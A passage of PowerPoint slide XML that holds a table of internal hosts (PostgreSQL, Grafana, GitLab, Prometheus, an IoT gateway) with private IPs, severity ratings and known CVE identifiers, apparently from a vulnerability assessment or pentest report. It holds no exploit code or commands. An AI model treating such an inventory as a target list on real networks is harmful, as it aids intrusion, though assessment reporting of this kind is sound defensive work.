                <a:solidFill>
                  <a:srgbClr val="F87171"/>
                </a:solidFill>
              </a:rPr>
              <a:t>2</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="63" name="TextBox 62"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6419088" y="4096512"/>
            <a:ext cx="5806440" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Kafka 3.1 · no-SASL · streaming · shipment-events</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="64" name="Rectangle 63"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="4306824"/>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92608" y="4343400"/>
            <a:ext cx="1920240" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="38BDF8"/>
                </a:solidFill>
              </a:rPr>
              <a:t>postgresql-shipdb</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="66" name="TextBox 65"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2304288" y="4343400"/>
            <a:ext cx="914400" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>service</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="67" name="TextBox 66"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3310128" y="4343400"/>
            <a:ext cx="1280160" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>172.20.0.17</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="68" name="TextBox 67"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4681728" y="4343400"/>
            <a:ext cx="868680" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="F87171"/>
                </a:solidFill>
              </a:rPr>
              <a:t>HIGH</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="69" name="TextBox 68"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5641848" y="4343400"/>
            <a:ext cx="685800" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="F87171"/>
                </a:solidFill>
              </a:rPr>
              <a:t>2</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="70" name="TextBox 69"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6419088" y="4343400"/>
            <a:ext cx="5806440" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>PostgreSQL 14 · PII · shipments · CVE-2024-0985</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="71" name="Rectangle 70"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="4553712"/>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92608" y="4590288"/>
            <a:ext cx="1920240" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="38BDF8"/>
                </a:solidFill>
              </a:rPr>
              <a:t>grafana-monitoring</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="73" name="TextBox 72"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2304288" y="4590288"/>
            <a:ext cx="914400" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>service</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="74" name="TextBox 73"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3310128" y="4590288"/>
            <a:ext cx="1280160" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>172.20.0.12</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="75" name="TextBox 74"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4681728" y="4590288"/>
            <a:ext cx="868680" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="FBBF24"/>
                </a:solidFill>
              </a:rPr>
              <a:t>MEDIUM</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="76" name="TextBox 75"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5641848" y="4590288"/>
            <a:ext cx="685800" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="F87171"/>
                </a:solidFill>
              </a:rPr>
              <a:t>2</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="77" name="TextBox 76"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6419088" y="4590288"/>
            <a:ext cx="5806440" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Grafana 8.2 · unauthenticated · port-9100 · CVE-2021-43798</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="78" name="Rectangle 77"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="4800600"/>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92608" y="4837176"/>
            <a:ext cx="1920240" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="38BDF8"/>
                </a:solidFill>
              </a:rPr>
              <a:t>gitlab-ce</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="80" name="TextBox 79"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2304288" y="4837176"/>
            <a:ext cx="914400" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>service</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="81" name="TextBox 80"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3310128" y="4837176"/>
            <a:ext cx="1280160" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>172.20.0.13</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="82" name="TextBox 81"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4681728" y="4837176"/>
            <a:ext cx="868680" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="F87171"/>
                </a:solidFill>
              </a:rPr>
              <a:t>HIGH</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="83" name="TextBox 82"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5641848" y="4837176"/>
            <a:ext cx="685800" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="F87171"/>
                </a:solidFill>
              </a:rPr>
              <a:t>2</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="84" name="TextBox 83"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6419088" y="4837176"/>
            <a:ext cx="5806440" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>GitLab 15.8 · CI-CD · source-code · CVE-2023-28154</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="85" name="Rectangle 84"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="5047488"/>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92608" y="5084064"/>
            <a:ext cx="1920240" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="38BDF8"/>
                </a:solidFill>
              </a:rPr>
              <a:t>prometheus</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="87" name="TextBox 86"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2304288" y="5084064"/>
            <a:ext cx="914400" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>service</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="88" name="TextBox 87"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3310128" y="5084064"/>
            <a:ext cx="1280160" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>172.20.0.16</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="89" name="TextBox 88"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4681728" y="5084064"/>
            <a:ext cx="868680" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="34D399"/>
                </a:solidFill>
              </a:rPr>
              <a:t>LOW</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="90" name="TextBox 89"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5641848" y="5084064"/>
            <a:ext cx="685800" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="F87171"/>
                </a:solidFill>
              </a:rPr>
              <a:t>1</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="91" name="TextBox 90"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6419088" y="5084064"/>
            <a:ext cx="5806440" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Prometheus 2.4 · metrics · unauthenticated · port-9191</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="92" name="Rectangle 91"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="5294376"/>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92608" y="5330952"/>
            <a:ext cx="1920240" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="38BDF8"/>
                </a:solidFill>
              </a:rPr>
              <a:t>warehouse-iot-gw</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="94" name="TextBox 93"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2304288" y="5330952"/>
            <a:ext cx="914400" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>container</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="95" name="TextBox 94"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3310128" y="5330952"/>
            <a:ext cx="1280160" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>172.20.0.19</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="96" name="TextBox 95"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4681728" y="5330952"/>
            <a:ext cx="868680" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="F87171"/>
                </a:solidFill>
              </a:rPr>
              <a:t>CRITICAL</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="97" name="TextBox 96"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5641848" y="5330952"/>
            <a:ext cx="685800" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="F87171"/>
                </a:solidFill>
              </a:rPr>
              <a:t>2</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="98" name="TextBox 97"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6419088" y="5330952"/>
            <a:ext cx="5806440" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>IoT · MQTT · warehouse · exposed · Python 3.9</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="99" name="Rectangle 98"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="5541264"/>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92608" y="5577840"/>
            <a:ext cx="1920240" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="38BDF8"/>
                </a:solidFill>
              </a:rPr>
              <a:t>route-optimizer</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="101" name="TextBox 100"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2304288" y="5577840"/>
            <a:ext cx="914400" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>service</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="102" name="TextBox 101"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3310128" y="5577840"/>
            <a:ext cx="1280160" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>172.20.0.18</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="103" name="TextBox 102"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4681728" y="5577840"/>
            <a:ext cx="868680" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="FBBF24"/>
                </a:solidFill>
              </a:rPr>
              <a:t>MEDIUM</a:t>
